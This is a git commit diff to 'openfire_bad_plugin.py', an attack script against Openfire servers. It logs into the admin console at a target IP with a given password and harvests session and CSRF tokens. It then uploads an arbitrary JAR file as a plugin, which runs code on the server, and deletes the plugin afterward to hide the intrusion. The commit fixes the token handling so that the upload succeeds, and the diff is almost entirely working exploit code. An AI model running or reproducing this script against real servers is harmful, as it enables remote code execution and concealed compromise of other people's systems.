c1fa6eab1d1dbf8d08dee369a0c8b49d98edd8bb
LazyTitan <80063008+LazyTitan33@users.noreply.github.com>
2023-02-11 11:11:50 +0200

    Update openfire_bad_plugin.py

--- openfire_bad_plugin.py
+++ openfire_bad_plugin.py
@@ -9,7 +9,7 @@ if len(sys.argv) <= 3:
     print(f'USAGE: python3 {sys.argv[0]} <admin_password> <Target_IP> <Jar_File>')
     exit(1)
 
-#get cookie and jessionid
+#get cookie and jsessionid
 get_csrf = f'http://{sys.argv[2]}:9090/login.jsp'
 session = requests.Session()
 r = session.get(get_csrf)
@@ -27,18 +27,26 @@ r = sess.post(login_url, data=data, headers={"Content-Type":"application/x-www-f
 cook = sess.cookies.get_dict()
 csrf2 = cook['csrf']
 print('[+] Logged in Admin Console')
+jsessionid2 = cook['JSESSIONID']
 
-#upload jar plugin file
+get_csrf3 = f'http://{sys.argv[2]}:9090/plugin-admin.jsp'
+session = requests.Session()
+r = session.get(get_csrf3, headers={"Cookie":f"JSESSIONID={jsessionid2}; csrf={csrf2}"})
+cook = session.cookies.get_dict()
+print('[+] Get JSESSIONID & CSRF Token')
+csrf3 = cook['csrf']
+
+#upload jar file
 print('[-] Uploading plugin file')
-jar_url = f'http://{sys.argv[2]}:9090/plugin-admin.jsp?uploadplugin&csrf={csrf2}'
+jar_url = f'http://{sys.argv[2]}:9090/plugin-admin.jsp?uploadplugin&csrf={csrf3}'
 mime = magic.Magic(mime=True)
 file_extension = pathlib.Path(f'{sys.argv[3]}').suffix
 jar_file = {('filename', (f'doesntmatter{file_extension}', open(f'{sys.argv[3]}','rb'), mime.from_file(f'{sys.argv[3]}')))}
-t = requests.post(jar_url, files=jar_file, headers={"Cookie":f"JSESSIONID={jsessionid}; csrf={csrf2}"})
+t = requests.post(jar_url, files=jar_file, headers={"Cookie":f"JSESSIONID={jsessionid2}; csrf={csrf3}"})
 print('[+] Uploaded Plugin')
 
 #delete plugin
 print('[-] Deleting Plugin')
-y = requests.get(f'http://{sys.argv[2]}:9090/plugin-admin.jsp?csrf={csrf2}&deleteplugin=doesntmatter', headers={"Cookie":f"JSESSIONID={jsessionid}; csrf={csrf2}"})
+y = requests.get(f'http://{sys.argv[2]}:9090/plugin-admin.jsp?csrf={csrf3}&deleteplugin=doesntmatter', headers={"Cookie":f"JSESSIONID={jsessionid2}; csrf={csrf3}"})
 print('[+] Deleted Plugin')
 print('[+] Profit?!')
